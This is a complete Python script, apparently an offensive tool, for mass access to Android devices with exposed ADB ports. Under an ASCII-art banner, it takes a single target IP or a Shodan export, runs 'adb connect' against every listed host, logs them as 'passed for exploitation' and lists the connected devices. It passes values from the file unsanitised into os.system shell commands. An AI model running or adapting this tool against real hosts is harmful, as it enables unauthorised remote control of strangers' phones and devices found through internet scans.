#!/usr/bin/env python3
import json
import logging
import os
from subprocess import Popen

logging.basicConfig(format='[%(asctime)s %(levelname)s]: %(message)s',
                    datefmt='%m/%d/%Y %I:%M:%S %p',
                    level='INFO')

logo_design_4 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
'''
print(logo_design_4)


def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument('--target-ip',
                        dest='ip',
                        required=False,
                        help='An IP address of the android device to connect to.')
    parser.add_argument('--target-port',
                        dest='port',
                        default=5555,
                        required=False,
                        help='A TCP port of the remote ADB service. Default is 5555')
    parser.add_argument('--shodan-file',
                        dest='shodan_file',
                        required=False,
                        help='A file with Shodan export in JSON format. '
                             'JSON entries must be separated with a new-line character.')
    options = parser.parse_args()

    return options


def read_shodan_json_file(file_name):
    logging.info('Reading %s', file_name)
    with open(file_name, 'r') as f:
        try:
            return [json.loads(line) for line in f.readlines()]
        except Exception as e:
            logging.error(e)
            return []


def connect_device(ip_address, port):
    logging.info('Probing %s:%s for an open ADB port', ip_address, port)
    try:
        os.system(f'adb connect {ip_address}:{port}')
    except Exception as e:
        logging.error('%s - %s', ip_address, e)


options = get_arguments()
android_devices = []
if options.ip:
    connect_device(ip_address=options.ip, port=options.port)
elif options.shodan_file:
    android_devices = read_shodan_json_file(file_name=options.shodan_file)
    if android_devices:
        os.system("adb tcpip 5555")
        logging.info('%s android devices have been passed for exploitation', len(android_devices))
        for device in android_devices:
            connect_device(device['ip_str'], device['port'])
logging.info('All connected devices:')
os.system('adb devices -l')
